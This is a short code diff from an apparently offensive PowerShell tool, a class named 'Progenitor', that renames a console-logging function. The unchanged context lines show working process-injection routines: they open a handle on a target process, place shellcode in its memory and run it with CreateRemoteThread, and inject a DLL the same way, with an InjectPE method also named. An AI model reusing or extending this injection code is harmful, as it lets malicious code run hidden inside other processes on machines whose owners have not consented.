@@ -115,10 +115,10 @@ class Progenitor {
         # Check | Process handle
         if ($hProc -eq [IntPtr]::Zero -or $hProc -eq 0) {
             $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-            Conwrite -name $conname -msg "Failed to get handle on PID: $tPID. Err: $err" -msgColor Red
+            Write-Console -name $conname -msg "Failed to get handle on PID: $tPID. Err: $err" -msgColor Red
             return $false
         } else {
-            Conwrite -name $conname -msg "Got handle on PID: $tPID as $hProc"
+            Write-Console -name $conname -msg "Got handle on PID: $tPID as $hProc"
         }
 
         # Shellcode | Patch
@@ -133,7 +133,7 @@ class Progenitor {
         $hThread = $W32::CreateRemoteThread($hProc, [intptr]::Zero, [UIntPtr]::Zero, $pRemoteMem, [intptr]::Zero, [uint32]0, [intptr]::Zero)
 
         # Output
-        Conwrite -name $conname -msg "Injected shellcode at [$($pRemoteMem.ToString("X"))] in thread [$hThread](PID: $tPID)" -msgColor Green
+        Write-Console -name $conname -msg "Injected shellcode at [$($pRemoteMem.ToString("X"))] in thread [$hThread](PID: $tPID)" -msgColor Green
         return $true
     }
 
@@ -191,7 +191,7 @@ class Progenitor {
         $hThread = $W32::CreateRemoteThread($hProc, [IntPtr]::Zero, [uintptr]::Zero, $remoteLL, $allocAddr, 0, [IntPtr]::Zero)
 
         # Console
-        Conwrite -name $conname -msg "Injected [$dllPath] into [$tPID] at [$($allocAddr.ToString('X'))](Thread: $hThread)"
+        Write-Console -name $conname -msg "Injected [$dllPath] into [$tPID] at [$($allocAddr.ToString('X'))](Thread: $hThread)"
     }
 
     static [void]InjectPE([string]$pePath) {
